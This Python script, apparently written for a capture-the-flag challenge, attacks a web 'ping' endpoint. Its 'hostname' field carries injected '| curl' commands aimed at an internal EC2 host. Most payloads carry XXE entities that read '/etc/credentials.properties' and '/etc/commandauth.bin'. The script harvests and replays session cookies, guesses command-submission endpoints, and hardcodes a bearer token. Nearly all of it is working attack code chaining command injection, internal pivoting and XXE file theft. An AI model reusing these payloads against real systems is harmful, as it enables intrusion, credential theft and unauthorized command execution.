import requests


token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdGlua3lmaXNoIiwibmFtZSI6InN0IW5reSIsImlhdCI6MTU1MTc4MzAwOH0.I97GwWb5eM7Qe0xQtDaKLCtrq4C5aXfHy9RFXuvz40c"
headers = {"Authorization": "Bearer "+token, "accept-encoding":"gzip, deflate, br", "accept-language":"en-US,en;q=0.9,ja-JP;q=0.8,ja;q=0.7,zh-TW;q=0.6,zh;q=0.5", "user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36", "accept":"application/json, text/plain, */*", "referer":"https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/foobarcampaign-messages/cncChat.html", "authority":"k7vo268tif.execute-api.us-east-1.amazonaws.com","Content-Type":"application/json"}

#payload
#payload example: XXE get properties
payload_00 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/credentials.properties\" >]><credentials><user>admin</user><password>&xxe;</password></credentials>\r\n------123--\r\n' -i -L"}

payload_01 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/login.jsp' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<credentials><user>aaa</user><password>7XIBXvzrWjOq8E5LnkBslZhKjLc+CG3HC5mJaj+Q13ATK0AYvf0ZrhkYVTcbYfFr</password></credentials>\r\n------123--\r\n' -i -L"}
payload_02 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/credentials.properties\">]><credentials><user>admin</user><password>7XIBXvzrWjOq8E5LnkBslZhKjLc+CG3HC5mJaj+Q13ATK0AYvf0ZrhkYVTcbYfFr</password></credentials>\r\n------123--\r\n' -i -L"}
payload_03 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/credentials.properties\">]><credentials><user>admin</user><password>7XIBXvzrWjOq8E5LnkBslZhKjLc+CG3HC5mJaj+Q13ATK0AYvf0ZrhkYVTcbYfFr</password></credentials>\r\n------123--\r\n' -i -L"}
payload_04 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/login.jsp' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -i -L"}
payload_05 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/index.jsp' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -i -L"}
payload_06 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/commandauth.bin\">]><credentials>&xxe;</credentials>\r\n------123--\r\n' -i -L"}
payload_07 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/commandauth.bin\" >]><credentials><user>admin</user><password>&xxe;</password></credentials>\r\n------123--\r\n' -i -L"}



#guess
payload_08 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -F authCode=test -F type=STOP -F target= -F argument="}
payload_09 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -F authCode=test -F type=STOP -F target= -F argument="}


def rockman():
    print("========== payload 01 login ==========")
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_01, headers=headers)
    print(r.status_code)
    print(r.text)

    #print(r.text.find("JSESSIONID="))
    sessionid01 = r.text.split("JSESSIONID=")[1].split(";")[0]
    print(sessionid01)
    print("========== payload 02 ==========")
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_02, headers=headers)
    print(r.status_code)
    print(r.text)

    sessionid02 = r.text.split("JSESSIONID=")[1].split(";")[0]
    print(sessionid02)
    sessionid03 = r.text.split("JSESSIONID=")[2].split(";")[0]
    print(sessionid03)
    sessionid04 = r.text.split("JSESSIONID=")[3].split(";")[0]
    print(sessionid04)

    print("========== payload 03 ==========")
    print(payload_03)
    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid02)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid03)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid04)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 04 ==========")
    print(payload_04)
    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid02)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid03)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid04)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 05 ==========")
    print(payload_05)
    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid02)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid03)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid04)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 06 ==========")
    print(payload_06)
    payload_06["hostname"] = payload_06["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_06, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 07 ==========")
    print(payload_07)
    #payload_07["hostname"] = payload_07["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_07, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 00 vs 07 ==========")
    print(payload_00)
    #payload_07["hostname"] = payload_07["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_00, headers=headers)
    print(r.status_code)
    print(r.text)



    print("========== payload 08 ==========")
    print(payload_08)
    payload_08["hostname"] = payload_08["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_08, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 09 ==========")
    print(payload_09)
    payload_09["hostname"] = payload_09["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_09, headers=headers)
    print(r.status_code)
    print(r.text)




    htmlwirter(r.text)




def htmlwirter(content):
    open('web.html','w').write(content)


if __name__=="__main__":
    rockman()